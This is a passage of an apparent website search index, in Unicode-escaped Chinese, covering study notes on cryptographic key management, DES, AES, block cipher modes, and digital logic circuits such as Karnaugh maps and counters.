key\uff09\u3002\u5b83\u662f\u7531\u7528\u6237\u9009\u5b9a\u6216\u7531\u7cfb\u7edf\u5206\u914d\u7ed9\u7528\u6237\u7684\uff0c\u53ef\u4ee5\u5728\u8f83\u957f\u65f6\u95f4\u5185\uff08\u76f8\u5bf9\u4e8e\u4f1a\u8bdd\u5bc6\u94a5\uff09\u7531\u4e00\u5bf9\u7528\u6237\uff08\u4f8b\u5982\u5bc6\u94a5\u5206\u914d\u4e2d\u5fc3\u4e0e\u67d0\u4e00\u7528\u6237\u4e4b\u95f4\uff0c\u6216\u8005\u4e24\u4e2a\u7528\u6237\u4e4b\u95f4\uff09\u6240\u4e13\u7528\u7684\u5bc6\u94a5\u3002\u5728\u67d0\u79cd\u7a0b\u5ea6\u4e0a\uff0c\u57fa\u672c\u5bc6\u94a5\u8fd8\u8d77\u5230\u4e86\u6807\u8bc6\u7528\u6237\u7684\u4f5c\u7528\u3002","title":"\u57fa\u672c\u5bc6\u94a5"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%8D%81%E7%AB%A0%20%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86/#\u4f1a\u8bdd\u5bc6\u94a5\u6570\u636e\u52a0\u5bc6\u79d8\u94a5","text":"\u5728\u4e00\u6b21\u901a\u4fe1\u6216\u6570\u636e\u4ea4\u6362\u4e2d\uff0c\u7528\u6237\u4e4b\u95f4\u6240\u4f7f\u7528\u7684\u5bc6\u94a5\uff0c\u662f\u7531\u901a\u4fe1\u7528\u6237\u4e4b\u95f4\u8fdb\u884c\u534f\u5546\u5f97\u5230\u7684\u3002\u5b83\u4e00\u822c\u662f\u52a8\u6001\u5730\u3001\u4ec5\u5728\u9700\u8981\u8fdb\u884c\u4f1a\u8bdd\u6570\u636e\u52a0\u5bc6\u65f6\u4ea7\u751f\uff0c\u5e76\u5728\u4f7f\u7528\u5b8c\u6bd5\u540e\u7acb\u5373\u8fdb\u884c\u6e05\u9664\u6389\u7684\uff0c\u4e5f\u79f0\u4e3a \u6570\u636e\u52a0\u5bc6\u5bc6\u94a5 (Data Encrypting Key)\u3002","title":"\u4f1a\u8bdd\u5bc6\u94a5\uff08\u6570\u636e\u52a0\u5bc6\u79d8\u94a5\uff09"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%8D%81%E7%AB%A0%20%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86/#\u5bc6\u94a5\u52a0\u5bc6\u5bc6\u94a5","text":"\u4e00\u822c\u662f\u7528\u6765\u5bf9\u4f20\u8f93\u7684\u4f1a\u8bdd\u5bc6\u94a5\u8fdb\u884c\u52a0\u5bc6\u65f6\u91c7\u7528\u7684\u5bc6\u94a5\uff0c\u53c8\u79f0\u4e3a \u4e8c\u7ea7\u5bc6\u94a5 (Secondary Key)\u3002\u5bc6\u94a5\u52a0\u5bc6\u5bc6\u94a5\u6240\u4fdd\u62a4\u7684\u5bf9\u8c61\u662f\u5b9e\u9645\u7528\u6765\u4fdd\u62a4\u901a\u4fe1\u6216\u6587\u4ef6\u6570\u636e\u7684\u4f1a\u8bdd\u5bc6\u94a5\u3002","title":"\u5bc6\u94a5\u52a0\u5bc6\u5bc6\u94a5"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%8D%81%E7%AB%A0%20%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86/#\u4e3b\u5bc6\u94a5","text":"\u5bf9\u5e94\u4e8e\u5c42\u6b21\u5316\u5bc6\u94a5\u7ed3\u6784\u4e2d\u7684\u6700\u9ad8\u5c42\u6b21\uff0c\u5b83\u662f\u5bf9\u5bc6\u94a5\u52a0\u5bc6\u5bc6\u94a5\u8fdb\u884c\u52a0\u5bc6\u7684\u5bc6\u94a5\uff0c\u4e3b\u5bc6\u94a5\u5e94\u53d7\u5230\u4e25\u683c\u7684\u4fdd\u62a4\u3002","title":"\u4e3b\u5bc6\u94a5"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%8D%81%E7%AB%A0%20%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86/#\u5bc6\u94a5\u5206\u5c42\u7ba1\u7406","text":"","title":"\u5bc6\u94a5\u5206\u5c42\u7ba1\u7406"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%8D%81%E7%AB%A0%20%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86/#d-h\u5bc6\u94a5\u534f\u5546","text":"","title":"D-H\u5bc6\u94a5\u534f\u5546"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%8D%81%E7%AB%A0%20%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86/#\u4e2d\u95f4\u4eba\u653b\u51fb","text":"","title":"\u4e2d\u95f4\u4eba\u653b\u51fb"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%8D%81%E7%AB%A0%20%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86/#\u5bc6\u94a5\u5206\u914d\u6280\u672f","text":"\u5bc6\u94a5\u5206\u914d\u6280\u672f\u4e00\u822c\u9700\u8981\u89e3\u51b3\u4e24\u4e2a\u65b9\u9762\u7684\u95ee\u9898\uff1a\u4e3a\u51cf\u8f7b\u8d1f\u62c5\uff0c\u63d0\u9ad8\u6548\u7387\uff0c\u5f15\u5165\u81ea\u52a8\u5bc6\u94a5\u5206\u914d\u673a\u5236\uff1b\u4e3a\u63d0\u9ad8\u5b89\u5168\u6027\uff0c\u5c3d\u53ef\u80fd\u51cf\u5c11\u7cfb\u7edf\u4e2d\u9a7b\u7559\u7684\u5bc6\u94a5\u91cf\u3002 \u4e3a\u4e86\u6ee1\u8db3\u8fd9\u4e24\u4e2a\u95ee\u9898\uff0c\u76ee\u524d\u6709\u4e24\u79cd\u7c7b\u578b\u7684\u5bc6\u94a5\u5206\u914d\u65b9\u6848\uff1a \u96c6\u4e2d\u5f0f \u548c \u5206\u5e03\u5f0f \u5bc6\u94a5\u5206\u914d\u65b9\u6848\u3002","title":"\u5bc6\u94a5\u5206\u914d\u6280\u672f"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%8D%81%E7%AB%A0%20%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86/#\u96c6\u4e2d\u5f0f\u5bc6\u94a5\u5206\u914d\u65b9\u6848","text":"\u96c6\u4e2d\u5f0f\u5bc6\u94a5\u5206\u914d\u65b9\u6848\u662f\u6307\u7531\u5bc6\u94a5\u5206\u914d\u4e2d\u5fc3\uff08KDC\uff09\u6216\u8005\u7531\u4e00\u7ec4\u8282\u70b9\u7ec4\u6210\u5c42\u6b21\u7ed3\u6784\u8d1f\u8d23\u5bc6\u94a5\u7684\u4ea7\u751f\u5e76\u5206\u914d\u7ed9\u901a\u4fe1\u53cc\u65b9\u3002","title":"\u96c6\u4e2d\u5f0f\u5bc6\u94a5\u5206\u914d\u65b9\u6848"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%8D%81%E7%AB%A0%20%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86/#\u5206\u5e03\u5f0f\u5bc6\u94a5\u5206\u914d\u65b9\u6848","text":"\u5206\u5e03\u5f0f\u5bc6\u94a5\u5206\u914d\u65b9\u6848\u662f\u6307\u7f51\u7edc\u901a\u4fe1\u4e2d\u5404\u4e2a\u901a\u4fe1\u65b9\u5177\u6709\u76f8\u540c\u7684\u5730\u4f4d\uff0c\u5b83\u4eec\u4e4b\u95f4\u7684\u5bc6\u94a5\u5206\u914d\u53d6\u51b3\u4e8e\u5b83\u4eec\u4e4b\u95f4\u7684\u534f\u5546\uff0c\u4e0d\u53d7\u4f55\u5176\u4ed6\u65b9\u7684\u9650\u5236\uff08\u66f4\u8fdb\u4e00\u6b65\uff0c\u53ef\u4ee5\u628a\u5bc6\u94a5\u5206\u914d\u4e2d\u5fc3\u5206\u6563\u5230\u6240\u6709\u7684\u901a\u4fe1\u65b9\uff0c\u5373\u6bcf\u4e2a\u901a\u4fe1\u65b9\u540c\u65f6\u4e5f\u662f\u5bc6\u94a5\u5206\u914d\u4e2d\u5fc3\uff09\u3002","title":"\u5206\u5e03\u5f0f\u5bc6\u94a5\u5206\u914d\u65b9\u6848"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%9B%9B%E7%AB%A0%20%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/","text":"\u5206\u7ec4\u5bc6\u7801\u4f53\u5236 # DES # \u52a0\u5bc6 # 1. \u521d\u59cb\u7f6e\u6362 \u7ed9\u5b9a\u660e\u6587\uff0c\u901a\u8fc7\u4e00\u4e2a\u56fa\u5b9a\u7684\u521d\u59cb\u7f6e\u6362IP\u6765\u91cd\u6392\u8f93\u5165\u660e\u6587\u5757P\u4e2d\u7684\u6bd4\u7279\uff0c\u5f97\u5230\u6bd4\u7279\u4e32P0=IP(P)=L0R0\uff0c\u8fd9\u91ccL0\u548cR0\u5206\u522b\u662fP0\u7684\u524d32\u6bd4\u7279\u548c\u540e32\u6bd4\u7279 2. \u8f6e\u7ed3\u6784\u53d8\u6362 F\u51fd\u6570\u6d41\u7a0b - E\u76d2\u6269\u5c55 - \u4e0e\u8f6e\u5bc6\u94a5\u5f02\u6216 E\u76d2\u6269\u5c55\u540e\u768448bit\u4e0e\u8f6e\u5bc6\u94a548bit\u8fdb\u884c\u5f02\u6216\u8fd0\u7b97 - S\u76d2\u4ee3\u66ff\u538b\u7f29 \u5c06\u5f97\u5230\u768448bit\u8fdb\u884c\u5206\u7ec4\uff0c\u6bcf\u7ec46\u4e2abit\uff0c\u7b2c\u4e00\u4e2abit\u548c\u6700\u540e\u4e00\u4e2abit\u7ec4\u6210\u7684\u5341\u8fdb\u5236\u4e3a\u884c\u53f7\uff0c\u7b2c2~5\u4e2abit\u7ec4\u6210\u7684\u5341\u8fdb\u5236\u4e3a\u5217\u53f7\uff0c\u4ece\u5bf9\u5e94\u7684S\u76d2\u4e2d\u62ff\u5230\u5bf9\u5e94\u7684\u6570 - P\u76d2\u7f6e\u6362\u8fd0\u7b97 3. \u5bc6\u94a5\u7f16\u6392\u7b97\u6cd5 \u9006\u521d\u59cb\u7f6e\u6362 \u89e3\u5bc6 # 2DES # AES # AES\u6709\u4e09\u4e2a\u7248\u672c\uff1aAES-128\u3001AES-192\u3001AES-256\uff0c\u76f8\u5e94\u7684\u8fed\u4ee3\u8f6e\u6570\u4e3a10\u8f6e\u300112\u8f6e\u300114\u8f6e\u3002 AES\u7b97\u6cd5\u7684\u5206\u7ec4\u957f\u5ea6\u56fa\u5b9a\u4e3a128 bits\uff0c\u56e0\u6b64AES\u660e\u6587\u5217\u6570\u7b49\u4e8e\u56fa\u5b9a\u503cNb=4 AES\u7b97\u6cd5\u7684\u5bc6\u94a5\u957f\u5ea6\u7684\u5217\u6570\u4e3a128bits\u3001192bits\u3001256bits\u4e09\u79cd\u4e0d\u540c\u957f\u5ea6\uff0c\u56e0\u6b64\u4e0d\u540c\u5bc6\u94a5\u957f\u5ea6Nk\u53ef\u4ee5\u53d6\u503c\u5206\u522b\u4e3a4\u30016\u30018 1. \u5b57\u8282\u4ee3\u66ff \u884c\u79fb\u4f4d \u5217\u6df7\u5408 \u8f6e\u5bc6\u94a5\u52a0 \u5bc6\u94a5\u6269\u5c55 \u5206\u7ec4\u5bc6\u7801\u7684\u8fd0\u884c\u6a21\u5f0f # ECB \u7535\u5b50\u7801\u672c # CBC \u5bc6\u7801\u5206\u7ec4\u94fe\u63a5 # \u9519\u8bef\u4f20\u64ad # \u660e\u6587\u6709\u4e00\u7ec4\u6709\u9519\uff0c\u89e3\u5bc6\u65f6\u53ea\u5f71\u54cd\u4e00\u7ec4\u7ed3\u679c \u4f20\u9001\u8fc7\u7a0b\u4e2d\u67d0\u7ec4\u5bc6\u6587\u51fa\u9519\uff0c\u5219\u8be5\u7ec4\u6062\u590d\u7684\u660e\u6587\u548c\u4e0b\u4e00\u7ec4\u6062\u590d\u6570\u636e\u51fa\u9519\uff0c\u5176\u4ed6\u4e0d\u5f71\u54cd \u4f20\u9001\u8fc7\u7a0b\u4e2d\u6bd4\u7279\u7f3a\u5931\uff0c\u5219\u5f71\u54cd\u6574\u4e2a\u89e3\u5bc6 CTR \u8ba1\u6570\u5668\u6a21\u5f0f # OFB \u8f93\u51fa\u53cd\u9988 # CFB \u5bc6\u7801\u53cd\u9988 # \u9519\u8bef\u4f20\u64ad # \u660e\u6587\u6709\u4e00\u7ec4\u6709\u9519\uff0c\u89e3\u5bc6\u65f6\u53ea\u5f71\u54cd\u4e00\u7ec4\u7ed3\u679c \u5bc6\u6587\u91cc\u7684\u4e00\u4f4d\u4f5c\u7269\u4f1a\u5f15\u8d77\u660e\u6587\u7684\u4e00\u4e2a\u5355\u72ec\u9519\u8bef\uff0c\u9519\u8bef\u5f71\u54cd\u76f4\u5230\u8be5\u9519\u8bef\u4ece\u79fb\u4f4d\u5bc4\u5b58\u5668\u4e2d\u88ab\u79fb\u51fa","title":"\u5206\u7ec4\u5bc6\u7801\u4f53\u5236"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%9B%9B%E7%AB%A0%20%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#\u5206\u7ec4\u5bc6\u7801\u4f53\u5236","text":"","title":"\u5206\u7ec4\u5bc6\u7801\u4f53\u5236"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%9B%9B%E7%AB%A0%20%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#des","text":"","title":"DES"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%9B%9B%E7%AB%A0%20%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#\u52a0\u5bc6","text":"1. \u521d\u59cb\u7f6e\u6362 \u7ed9\u5b9a\u660e\u6587\uff0c\u901a\u8fc7\u4e00\u4e2a\u56fa\u5b9a\u7684\u521d\u59cb\u7f6e\u6362IP\u6765\u91cd\u6392\u8f93\u5165\u660e\u6587\u5757P\u4e2d\u7684\u6bd4\u7279\uff0c\u5f97\u5230\u6bd4\u7279\u4e32P0=IP(P)=L0R0\uff0c\u8fd9\u91ccL0\u548cR0\u5206\u522b\u662fP0\u7684\u524d32\u6bd4\u7279\u548c\u540e32\u6bd4\u7279 2. \u8f6e\u7ed3\u6784\u53d8\u6362 F\u51fd\u6570\u6d41\u7a0b - E\u76d2\u6269\u5c55 - \u4e0e\u8f6e\u5bc6\u94a5\u5f02\u6216 E\u76d2\u6269\u5c55\u540e\u768448bit\u4e0e\u8f6e\u5bc6\u94a548bit\u8fdb\u884c\u5f02\u6216\u8fd0\u7b97 - S\u76d2\u4ee3\u66ff\u538b\u7f29 \u5c06\u5f97\u5230\u768448bit\u8fdb\u884c\u5206\u7ec4\uff0c\u6bcf\u7ec46\u4e2abit\uff0c\u7b2c\u4e00\u4e2abit\u548c\u6700\u540e\u4e00\u4e2abit\u7ec4\u6210\u7684\u5341\u8fdb\u5236\u4e3a\u884c\u53f7\uff0c\u7b2c2~5\u4e2abit\u7ec4\u6210\u7684\u5341\u8fdb\u5236\u4e3a\u5217\u53f7\uff0c\u4ece\u5bf9\u5e94\u7684S\u76d2\u4e2d\u62ff\u5230\u5bf9\u5e94\u7684\u6570 - P\u76d2\u7f6e\u6362\u8fd0\u7b97 3. \u5bc6\u94a5\u7f16\u6392\u7b97\u6cd5 \u9006\u521d\u59cb\u7f6e\u6362","title":"\u52a0\u5bc6"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%9B%9B%E7%AB%A0%20%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#\u89e3\u5bc6","text":"","title":"\u89e3\u5bc6"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%9B%9B%E7%AB%A0%20%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#2des","text":"","title":"2DES"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%9B%9B%E7%AB%A0%20%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#aes","text":"AES\u6709\u4e09\u4e2a\u7248\u672c\uff1aAES-128\u3001AES-192\u3001AES-256\uff0c\u76f8\u5e94\u7684\u8fed\u4ee3\u8f6e\u6570\u4e3a10\u8f6e\u300112\u8f6e\u300114\u8f6e\u3002 AES\u7b97\u6cd5\u7684\u5206\u7ec4\u957f\u5ea6\u56fa\u5b9a\u4e3a128 bits\uff0c\u56e0\u6b64AES\u660e\u6587\u5217\u6570\u7b49\u4e8e\u56fa\u5b9a\u503cNb=4 AES\u7b97\u6cd5\u7684\u5bc6\u94a5\u957f\u5ea6\u7684\u5217\u6570\u4e3a128bits\u3001192bits\u3001256bits\u4e09\u79cd\u4e0d\u540c\u957f\u5ea6\uff0c\u56e0\u6b64\u4e0d\u540c\u5bc6\u94a5\u957f\u5ea6Nk\u53ef\u4ee5\u53d6\u503c\u5206\u522b\u4e3a4\u30016\u30018 1. \u5b57\u8282\u4ee3\u66ff \u884c\u79fb\u4f4d \u5217\u6df7\u5408 \u8f6e\u5bc6\u94a5\u52a0 \u5bc6\u94a5\u6269\u5c55","title":"AES"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%9B%9B%E7%AB%A0%20%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#\u5206\u7ec4\u5bc6\u7801\u7684\u8fd0\u884c\u6a21\u5f0f","text":"","title":"\u5206\u7ec4\u5bc6\u7801\u7684\u8fd0\u884c\u6a21\u5f0f"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%9B%9B%E7%AB%A0%20%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#ecb-\u7535\u5b50\u7801\u672c","text":"","title":"ECB \u7535\u5b50\u7801\u672c"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%9B%9B%E7%AB%A0%20%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#cbc-\u5bc6\u7801\u5206\u7ec4\u94fe\u63a5","text":"","title":"CBC \u5bc6\u7801\u5206\u7ec4\u94fe\u63a5"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%9B%9B%E7%AB%A0%20%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#\u9519\u8bef\u4f20\u64ad","text":"\u660e\u6587\u6709\u4e00\u7ec4\u6709\u9519\uff0c\u89e3\u5bc6\u65f6\u53ea\u5f71\u54cd\u4e00\u7ec4\u7ed3\u679c \u4f20\u9001\u8fc7\u7a0b\u4e2d\u67d0\u7ec4\u5bc6\u6587\u51fa\u9519\uff0c\u5219\u8be5\u7ec4\u6062\u590d\u7684\u660e\u6587\u548c\u4e0b\u4e00\u7ec4\u6062\u590d\u6570\u636e\u51fa\u9519\uff0c\u5176\u4ed6\u4e0d\u5f71\u54cd \u4f20\u9001\u8fc7\u7a0b\u4e2d\u6bd4\u7279\u7f3a\u5931\uff0c\u5219\u5f71\u54cd\u6574\u4e2a\u89e3\u5bc6","title":"\u9519\u8bef\u4f20\u64ad"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%9B%9B%E7%AB%A0%20%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#ctr-\u8ba1\u6570\u5668\u6a21\u5f0f","text":"","title":"CTR \u8ba1\u6570\u5668\u6a21\u5f0f"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%9B%9B%E7%AB%A0%20%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#ofb-\u8f93\u51fa\u53cd\u9988","text":"","title":"OFB \u8f93\u51fa\u53cd\u9988"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%9B%9B%E7%AB%A0%20%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#cfb-\u5bc6\u7801\u53cd\u9988","text":"","title":"CFB \u5bc6\u7801\u53cd\u9988"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%9B%9B%E7%AB%A0%20%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#\u9519\u8bef\u4f20\u64ad_1","text":"\u660e\u6587\u6709\u4e00\u7ec4\u6709\u9519\uff0c\u89e3\u5bc6\u65f6\u53ea\u5f71\u54cd\u4e00\u7ec4\u7ed3\u679c \u5bc6\u6587\u91cc\u7684\u4e00\u4f4d\u4f5c\u7269\u4f1a\u5f15\u8d77\u660e\u6587\u7684\u4e00\u4e2a\u5355\u72ec\u9519\u8bef\uff0c\u9519\u8bef\u5f71\u54cd\u76f4\u5230\u8be5\u9519\u8bef\u4ece\u79fb\u4f4d\u5bc4\u5b58\u5668\u4e2d\u88ab\u79fb\u51fa","title":"\u9519\u8bef\u4f20\u64ad"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%94%B5/%E5%85%AC%E5%BC%8F%E6%B3%95%E5%92%8C%E5%8D%A1%E8%AF%BA%E5%9B%BE/","text":"\u516c\u5f0f\u6cd5 # \u5361\u8bfa\u56fe #","title":"\u516c\u5f0f\u6cd5"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%94%B5/%E5%85%AC%E5%BC%8F%E6%B3%95%E5%92%8C%E5%8D%A1%E8%AF%BA%E5%9B%BE/#\u516c\u5f0f\u6cd5","text":"","title":"\u516c\u5f0f\u6cd5"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%94%B5/%E5%85%AC%E5%BC%8F%E6%B3%95%E5%92%8C%E5%8D%A1%E8%AF%BA%E5%9B%BE/#\u5361\u8bfa\u56fe","text":"","title":"\u5361\u8bfa\u56fe"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%94%B5/%E5%B8%B8%E7%94%A8%E7%BB%84%E5%90%88%E9%80%BB%E8%BE%91%E5%99%A8%E4%BB%B6/","text":"\u5e38\u7528\u7ec4\u5408\u903b\u8f91\u5668\u4ef6 # \u5e38\u7528\u7ec4\u5408\u903b\u8f91\u5668\u4ef6\u5206\u6790 # \u7efc\u5408\u5e94\u7528 #","title":"\u5e38\u7528\u7ec4\u5408\u903b\u8f91\u5668\u4ef6"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%94%B5/%E5%B8%B8%E7%94%A8%E7%BB%84%E5%90%88%E9%80%BB%E8%BE%91%E5%99%A8%E4%BB%B6/#\u5e38\u7528\u7ec4\u5408\u903b\u8f91\u5668\u4ef6","text":"","title":"\u5e38\u7528\u7ec4\u5408\u903b\u8f91\u5668\u4ef6"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%94%B5/%E5%B8%B8%E7%94%A8%E7%BB%84%E5%90%88%E9%80%BB%E8%BE%91%E5%99%A8%E4%BB%B6/#\u5e38\u7528\u7ec4\u5408\u903b\u8f91\u5668\u4ef6\u5206\u6790","text":"","title":"\u5e38\u7528\u7ec4\u5408\u903b\u8f91\u5668\u4ef6\u5206\u6790"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%94%B5/%E5%B8%B8%E7%94%A8%E7%BB%84%E5%90%88%E9%80%BB%E8%BE%91%E5%99%A8%E4%BB%B6/#\u7efc\u5408\u5e94\u7528","text":"","title":"\u7efc\u5408\u5e94\u7528"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%94%B5/%E6%95%B0%E7%94%B5/","text":"\u6570\u7535 Overview # type: folder_brief_live noteOnly: true style: strip","title":"\u6570\u7535 Overview"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%94%B5/%E6%95%B0%E7%94%B5/#\u6570\u7535-overview","text":"type: folder_brief_live noteOnly: true style: strip","title":"\u6570\u7535 Overview"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%94%B5/%E6%97%B6%E5%BA%8F%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF%E5%88%86%E6%9E%90/","text":"\u65f6\u5e8f\u903b\u8f91\u7535\u8def\u5206\u6790 # \u540c\u6b65\u4e0e\u5f02\u6b65\u7684\u533a\u522b # \u540c\u6b65\u65f6\u5e8f\u903b\u8f91\u7535\u8def\u5206\u6790 # \u903b\u8f91\u529f\u80fd\u662f\u516d\u8fdb\u5236\u8ba1\u6570\u5668 \u65e0\u8f93\u5165\u65e0\u8f93\u51fa\u7684\u65f6\u5e8f\u903b\u8f91\u7535\u8def\u4e00\u822c\u662f\u8ba1\u6570\u5668\uff0c\u73af\u4e2d\u6709\u51e0\u4e2a\u72b6\u6001\u5c31\u662f\u51e0\u8fdb\u5236\u8ba1\u6570\u5668","title":"\u65f6\u5e8f\u903b\u8f91\u7535\u8def\u5206\u6790"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%94%B5/%E6%97%B6%E5%BA%8F%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF%E5%88%86%E6%9E%90/#\u65f6\u5e8f\u903b\u8f91\u7535\u8def\u5206\u6790","text":"","title":"\u65f6\u5e8f\u903b\u8f91\u7535\u8def\u5206\u6790"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%94%B5/%E6%97%B6%E5%BA%8F%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF%E5%88%86%E6%9E%90/#\u540c\u6b65\u4e0e\u5f02\u6b65\u7684\u533a\u522b","text":"","title":"\u540c\u6b65\u4e0e\u5f02\u6b65\u7684\u533a\u522b"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%94%B5/%E6%97%B6%E5%BA%8F%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF%E5%88%86%E6%9E%90/#\u540c\u6b65\u65f6\u5e8f\u903b\u8f91\u7535\u8def\u5206\u6790","text":"\u903b\u8f91\u529f\u80fd\u662f\u516d\u8fdb\u5236\u8ba1\u6570\u5668 \u65e0\u8f93\u5165\u65e0\u8f93\u51fa\u7684\u65f6\u5e8f\u903b\u8f91\u7535\u8def\u4e00\u822c\u662f\u8ba1\u6570\u5668\uff0c\u73af\u4e2d\u6709\u51e0\u4e2a\u72b6\u6001\u5c31\u662f\u51e0\u8fdb\u5236\u8ba1\u6570\u5668","title":"\u540c\u6b65\u65f6\u5e8f\u903b\u8f91\u7535\u8def\u5206\u6790"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%94%B5/%E6%97%B6%E5%BA%8F%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF%E8%AE%BE%E8%AE%A1/","text":"\u65f6\u5e8f\u903b\u8f91\u7535\u8def\u8bbe\u8ba1 #","title":"\u65f6\u5e8f\u903b\u8f91\u7535\u8def\u8bbe\u8ba1"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%94%B5/%E6%97%B6%E5%BA%8F%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF%E8%AE%BE%E8%AE%A1/#\u65f6\u5e8f\u903b\u8f91\u7535\u8def\u8bbe\u8ba1","text":"","title":"\u65f6\u5e8f\u903b\u8f91\u7535\u8def\u8bbe\u8ba1"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%94%B5/%E7%BB%84%E5%90%88%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF/","text":"\u7ec4\u5408\u903b\u8f91\u7535\u8def # \u7ec4\u5408\u903b\u8f91\u7535\u8def\u5206\u6790 # \u7ec4\u5408\u903b\u8f91\u7535\u8def\u8bbe\u8ba1 